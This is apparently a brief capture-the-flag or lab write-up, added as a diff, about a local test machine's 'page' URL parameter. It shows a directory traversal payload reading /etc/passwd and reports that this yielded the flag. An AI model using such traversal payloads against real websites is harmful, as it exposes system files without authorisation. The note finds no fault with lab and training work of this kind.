@@ -1,0 +1,7 @@
+http://192.168.56.101/?page=survey
+
+The url may be exploitable. Lets try to use the page parameter to navigate where we shouldnt could.
+
+http://192.168.56.101/?page=../../../../../../../../../../etc/passwd
+
+We got the flag, houray !
